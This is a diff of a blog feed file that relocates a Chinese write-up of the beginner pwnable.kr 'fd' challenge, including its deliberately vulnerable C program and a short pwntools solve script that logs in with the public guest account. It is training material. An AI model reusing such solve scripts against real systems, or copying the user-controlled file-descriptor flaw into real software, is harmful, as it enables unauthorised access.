@@ -443,27 +443,6 @@
       </tags>
   </entry>
   <entry>
-    <title>fd</title>
-    <url>/2021/06/03/pwnable/Toddlers_Bottle/fd/</url>
-    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
-<p>题目附件：<a href="/files/pwnable/toddlers_bottle/fd">点我下载</a></p>
-<h2 id="程序源码">程序源码</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="题目分析">题目分析</h2>
-<p>很容易可以看出，如果传入的第一个参数值是<code>0x1234</code>的话我们就可以使得fd=0，这样的话read读入的stdin可以由我们自己输入。</p>
-<h2 id="脚本源码">脚本源码</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;fd&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">process = s.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="string">&#x27;4660&#x27;</span>])</span><br><span class="line">process.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br><span class="line">process.recvline()</span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">process.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>pwnable</category>
-      </categories>
-      <tags>
-        <tag>pwnable</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>col</title>
     <url>/2021/06/03/pwnable/Toddlers_Bottle/col/</url>
     <content><![CDATA[<h2 id="原题内容">原题内容</h2>
@@ -497,6 +476,27 @@
 <p>直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。</p>
 <p>用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词<code>//upx.sf.net $\n</code>，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。<a href="/files/tools/UPXShell.exe">点我下载UPXShell</a></p>
 <p>脱壳后再打开，Shift + F12先搜索&quot;flag&quot;试试，直接搜到flag。</p>
+]]></content>
+      <categories>
+        <category>pwnable</category>
+      </categories>
+      <tags>
+        <tag>pwnable</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fd</title>
+    <url>/2021/06/03/pwnable/Toddlers_Bottle/fd/</url>
+    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<p>题目附件：<a href="/files/pwnable/toddlers_bottle/fd">点我下载</a></p>
+<h2 id="程序源码">程序源码</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析">题目分析</h2>
+<p>很容易可以看出，如果传入的第一个参数值是<code>0x1234</code>的话我们就可以使得fd=0，这样的话read读入的stdin可以由我们自己输入。</p>
+<h2 id="脚本源码">脚本源码</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;fd&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">process = s.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="string">&#x27;4660&#x27;</span>])</span><br><span class="line">process.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br><span class="line">process.recvline()</span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">process.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>pwnable</category>
